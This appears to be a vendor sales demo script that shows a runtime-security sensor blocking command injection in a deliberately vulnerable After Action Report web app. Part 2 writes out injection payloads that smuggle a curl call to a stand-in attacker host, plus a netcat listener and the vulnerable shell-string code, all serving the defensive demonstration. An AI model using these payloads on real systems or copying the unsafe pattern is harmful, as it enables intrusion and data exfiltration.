# AAR System - Runtime Security Demo Script

## Overview
This document provides a step-by-step script for demonstrating runtime security capabilities to Federal and Defense sector buyers using the After Action Report Management System.

**Duration**: 15-20 minutes
**Audience**: Federal/Defense IT security decision makers, CISO offices, DevSecOps teams
**Objective**: Demonstrate real-time runtime protection against command injection attacks

---

## Pre-Demo Checklist

### Environment Setup (15 minutes before demo)

- [ ] Application is running on `http://localhost:8080`
- [ ] wkhtmltopdf is installed and functional (`wkhtmltopdf --version`)
- [ ] Web browser is open and ready
- [ ] Terminal window visible for showing command execution
- [ ] Runtime security sensor configured and ready to enable/disable
- [ ] Screen sharing/projection tested
- [ ] Backup terminal ready for live attack demonstration

### Optional Setup
- [ ] Network monitoring tool (Wireshark/tcpdump) to show exfiltration
- [ ] HTTP listener on attacker machine (`nc -lvp 8000`)
- [ ] S3 bucket configured with sample documents

---

## Demo Script

### Part 1: Application Introduction (3-4 minutes)

#### Script:

> "Good morning/afternoon. Today I'm going to demonstrate how runtime security protects applications from zero-day vulnerabilities in real-time, using a realistic Defense use case.
>
> This is an After Action Report Management System - a type of application commonly used across DoD to document operations, training exercises, and missions. Notice the authentic DoD elements..."

**Actions:**
1. Navigate to `http://localhost:8080`
2. Point out key features:
   - Classification banners (UNCLASSIFIED // FOUO)
   - Military terminology (DTG, AO, Unit Designation)
   - Professional DoD color scheme
   - Realistic workflow

3. Browse through the dashboard
   ```
   Show: Total AARs, mission type breakdown, recent reports
   ```

4. Click "Browse AARs" to show the list view
   ```
   Point out: Search/filter capabilities, multiple mission types
   ```

5. Click on "Operation Enduring Shield" (first AAR)
   ```
   Show: Full AAR details, operational metadata, lessons learned
   Highlight: "Attachments" section with documents stored in S3
   ```

> "This application handles sensitive operational data, stores documents in S3, and generates reports - typical of applications across the Defense sector. Now let me show you why this matters for security..."

---

### Part 2: The Threat - Command Injection Attack (5-6 minutes)

#### Script:

> "This application, like many in production today, contains a vulnerability. It's not because developers are careless - it's because modern applications are complex. This one has over 1,000 lines of code across multiple files. The vulnerability is in the PDF report generation feature.
>
> Let me show you how an attacker would exploit this..."

**Actions:**

1. Navigate back to "Browse AARs"

2. Click on **"Operation Phantom Strike"** (AAR-20251107-0003)

3. Zoom in on or highlight the Operation Name
   ```
   Point out: "Notice this operation name has unusual characters -
              single quotes, semicolons, dollar signs. This is our payload."
   ```

4. Read the Operation Name aloud slowly:
   ```
   "Operation Phantom Strike'; curl http://attacker.example.com/exfil?data=$(whoami); echo 'Complete"
   ```

5. Explain the attack:
   > "What's happening here?
   > - The application uses this Operation Name in a shell command to generate a PDF
   > - The single quote breaks out of the command
   > - The semicolon allows executing a new command
   > - The $(whoami) executes a sub-command to get the current user
   > - The attacker exfiltrates this data to their server
   > - This is a command injection vulnerability - CWE-77, CVSS score 9.8 Critical"

6. Show the vulnerable code (optional - technical audience):
   ```bash
   # Open handlers/aar_report.go in editor
   # Navigate to line ~47
   # Show: fmt.Sprintf("wkhtmltopdf --title '%s' ...", aar.OperationName)
   ```

7. Explain impact:
   > "Once an attacker has command injection, they can:
   > - Establish a reverse shell
   > - Exfiltrate sensitive data (reports, credentials, keys)
   > - Modify or delete operational data
   > - Create backdoor accounts
   > - Pivot to other systems on the network
   > - In a Defense context: compromise mission data, operational plans, personnel information"

#### **DEMONSTRATION WITHOUT PROTECTION**

8. Set up attack listener (in separate terminal):
   ```bash
   # Terminal 1: Listen for incoming connection
   nc -lvp 8000
   ```

9. Modify the payload in your pre-populated AAR to hit your listener:
   ```
   # If doing live, create new AAR with:
   Operation Name: Test Op'; curl http://localhost:8000/pwned?user=$(whoami)&host=$(hostname); echo 'Success
   ```

10. Click **"Generate PDF Report"**

11. Show the terminal:
    ```
    Listening on 0.0.0.0 8000
    Connection received on localhost 43210
    GET /pwned?user=your-username&host=your-hostname HTTP/1.1
    ```

12. Emphasize:
    > "The attack succeeded. The application executed arbitrary commands. The attacker now has remote code execution. In a real attack, this would be a reverse shell giving full control of the server.
    >
    > Notice - this happened AFTER the application was deployed, during runtime. Static analysis might miss this. WAF wouldn't catch it - it's a normal HTTP POST request. Network security sees legitimate traffic to an external server.
    >
    > Traditional security failed to prevent this."

---

### Part 3: Runtime Protection in Action (5-6 minutes)

#### Script:

> "Now let me show you what happens with runtime security enabled. I'm going to enable our runtime protection sensor. This sensor monitors the application's behavior in real-time - every process execution, every file operation, every network connection.
>
> Importantly, it doesn't rely on signatures or known vulnerabilities. It uses behavioral analysis to detect malicious activity."

**Actions:**

1. Enable your runtime security sensor
   ```
   # Command varies by your product
   # Example: systemctl start runtime-sensor
   # Or: enable protection in your dashboard
   ```

2. Show sensor is active (in your product's UI/CLI)
   ```
   Status: Active
   Mode: Protect
   Application: aar-system
   ```

3. Navigate back to "Operation Phantom Strike"

4. Click **"Generate PDF Report"** again

#### **DEMONSTRATION WITH PROTECTION**

5. Show that the request is blocked
   ```
   Expected: Error message or failed report generation
   Application continues running normally
   ```

6. Switch to your runtime security dashboard/logs

7. Show the detection event:
   ```
   Highlight:
   - Timestamp (real-time, within microseconds)
   - Alert: Command Injection Detected
   - Process: sh -c "wkhtmltopdf --title 'Operation Phantom Strike'; curl..."
   - Action: BLOCKED
   - Severity: CRITICAL
   - Context: Triggered by wkhtmltopdf -> sh -> curl chain
   ```

8. Explain what happened:
   > "The runtime sensor detected the attack in real-time:
   > 1. Application called wkhtmltopdf (expected, legitimate)
   > 2. wkhtmltopdf spawned sh -c (suspicious but possible)
   > 3. sh spawned curl (unexpected, malicious)
   > 4. curl attempted network connection (blocked)
   >
   > The sensor analyzed the full execution chain and determined this violated the application's normal behavior profile. It blocked the malicious process before it could execute.
   >
   > Notice the legitimate application continued working - only the attack was stopped."

9. Show the application is still running:
   ```
   Navigate to Dashboard - still works
   Browse other AARs - still works
   View legitimate reports - still works
   ```

10. Contrast with traditional security:
    | Security Layer | Result |
    |---------------|--------|
    | Static Analysis | Missed (indirect construction) |
    | Dependency Scanning | Missed (no vulnerable dependencies) |
    | WAF/IDS | Missed (legitimate HTTP) |
    | Network Firewall | Missed (allowed outbound) |
    | **Runtime Protection** | ✅ **BLOCKED** |

---

### Part 4: Value for Federal/Defense (3-4 minutes)

#### Script:

> "Let me put this in context for Federal and Defense environments..."

**Key Points to Emphasize:**

#### 1. **Zero-Day Protection**
> "This was an unknown vulnerability - no CVE, no signature, no patch. Traditional security couldn't stop it. Runtime protection did.
>
> In Defense, you face nation-state adversaries with zero-day exploits. Runtime security is your last line of defense."

#### 2. **Compliance & Zero Trust**
> "This aligns with Federal security requirements:
> - NIST 800-53 - Continuous monitoring and response (CA-7, SI-4)
> - FedRAMP - Real-time security monitoring
> - Zero Trust Architecture - Never trust, always verify
> - Executive Order 14028 - Software supply chain security
>
> Runtime protection verifies application behavior continuously, not just at deployment."

#### 3. **Cloud-Native & S3 Security**
> "Notice this application uses S3 for document storage - just like most modern Defense applications. The attack could have:
> - Exfiltrated S3 credentials from environment variables
> - Downloaded classified documents from S3
> - Modified operational data in S3
>
> Runtime protection monitors S3 API calls and detects anomalous access patterns."

#### 4. **Minimal Impact**
> "The sensor adds microseconds of latency - imperceptible to users. The application continues operating normally. No code changes required - it works with applications written in any language: Go, Java, Python, Node.js, .NET."

#### 5. **Defense in Depth**
> "Runtime protection doesn't replace your existing security - it complements it:
> - WAF blocks known attacks → Runtime blocks unknown attacks
> - Static analysis finds code vulnerabilities → Runtime stops exploitation attempts
> - Network security controls traffic → Runtime controls application behavior
> - You get visibility and protection all the way to the OS level"

#### 6. **DevSecOps Integration**
> "For DevSecOps teams, runtime protection provides:
> - Immediate feedback when vulnerabilities are exploited
> - Detailed forensics for incident response
> - No build pipeline changes
> - Works in containers, Kubernetes, VMs, bare metal
> - Integrates with your SIEM/SOAR (Splunk, Sentinel, etc.)"

---

### Part 5: Q&A and Next Steps (2-3 minutes)

#### Common Questions & Answers:

**Q: "Does this work with classified systems?"**
> A: "Yes, our sensor runs entirely on-premise with no external dependencies. All telemetry stays within your environment. We have customers running in airgapped classified networks."

**Q: "What about performance impact?"**
> A: "Typical overhead is 1-3% CPU and minimal memory. For this demo application, detection happens in microseconds. We can provide performance benchmarks for your specific workload."

**Q: "How does it learn application behavior?"**
> A: "The sensor uses a combination of baseline learning and behavioral modeling. Initial learning period is typically 24-48 hours. You can also use policy-based protection from day one."

**Q: "Can developers bypass the protection?"**
> A: "No - the sensor operates at the kernel level with tamper protection. Even privileged users cannot disable it without proper authorization. All changes are logged."

**Q: "How is this different from EDR?"**
> A: "EDR focuses on endpoint threats (malware, lateral movement). Runtime protection focuses on application-layer attacks - zero-days, logic vulnerabilities, data exfiltration. They're complementary. Many customers use both."

**Q: "What's the deployment process?"**
> A: "Installation is typically:
> 1. Deploy sensor agent (DEB/RPM package or container sidecar)
> 2. Configure application monitoring
> 3. Enable protection mode
> Total time: 30-60 minutes for initial deployment. We provide Ansible playbooks, Helm charts, and CloudFormation templates."

---

## Demo Variations

### Extended Demo (30 minutes)
Add these sections:

1. **Live Exploitation**
   - Set up full reverse shell listener
   - Show actual shell access
   - Demonstrate data exfiltration from S3
   - Show credential harvesting

2. **Forensics Deep Dive**
   - Show full execution tree in runtime dashboard
   - Demonstrate process ancestry
   - Show network connection attempts
   - Export forensic report

3. **Policy Configuration**
   - Show how to create custom policies
   - Demonstrate allow-listing for legitimate tools
   - Show integration with CI/CD for policy-as-code

### Technical Deep Dive (45 minutes)
For technical audiences (architects, security engineers):

1. **Architecture Review**
   - Show sensor deployment architecture
   - Explain eBPF/kernel integration
   - Discuss data flow and telemetry
   - Review scalability (performance at scale)

2. **Integration Demo**
   - Live SIEM integration (Splunk/ELK)
   - API demonstration
   - Alert webhook testing
   - Incident response workflow

3. **Advanced Protection**
   - File integrity monitoring
   - Drift detection
   - Cryptomining prevention
   - Supply chain attack scenarios

---

## Backup Plans

### If wkhtmltopdf is not available:
> "For this demo, I'm showing you the vulnerability in the code. In a production environment, this would execute. Let me show you our runtime dashboard logs from a previous test..."

[Have pre-recorded screenshots/video]

### If network is unreliable:
> "I'm going to demonstrate this locally without external network. The same principle applies - the attacker could exfiltrate to any external server or establish a reverse shell."

Use `localhost` for all attack demonstrations.

### If runtime sensor has issues:
> "Let me show you the detection in our pre-production environment..."

[Have backup screenshots/logs ready]

---

## Follow-Up Materials

Provide these to attendees:

1. **Technical Whitepaper**
   - Detailed vulnerability analysis
   - Runtime protection architecture
   - Performance benchmarks
   - Compliance mapping (NIST, FedRAMP, DISA)

2. **Case Study**
   - Similar Federal agency deployment
   - ROI analysis
   - Threat prevented metrics

3. **Evaluation Kit**
   - This demo application source code
   - 30-day sensor trial
   - Setup guide for their environment
   - Technical support contact

4. **Proposal**
   - Pricing for their environment
   - Professional services scope
   - Training plan
   - Support SLA options

---

## Key Takeaways

Reinforce these messages:

✅ **Real-time Protection**: Blocks attacks as they happen, not after breach
✅ **Zero-Day Defense**: No signatures needed - behavioral detection
✅ **Defense-Proven**: Built for applications handling classified and sensitive data
✅ **Cloud-Native**: Works with S3, containers, serverless
✅ **Minimal Impact**: Microseconds of overhead, no code changes
✅ **Compliance-Ready**: Meets FedRAMP, NIST 800-53, DISA STIG requirements
✅ **Defense in Depth**: Complements existing security controls
✅ **DevSecOps-Friendly**: Integrates with existing pipelines and workflows

---

## Post-Demo

1. **Immediate follow-up** (same day):
   - Email thank you with demo recording
   - Attach technical materials
   - Propose technical deep dive

2. **Technical validation** (within 1 week):
   - Deploy sensor in their test environment
   - Run against their applications
   - Provide threat report

3. **Pilot program** (30-60 days):
   - Deploy to small production subset
   - Measure ROI (threats blocked, time saved)
   - Executive briefing on results

4. **Full deployment** (90 days):
   - Rollout to production
   - Training for security/ops teams
   - Ongoing optimization

---

**End of Demo Script**

*For questions or assistance with this demo, contact your Endura sales representative.*
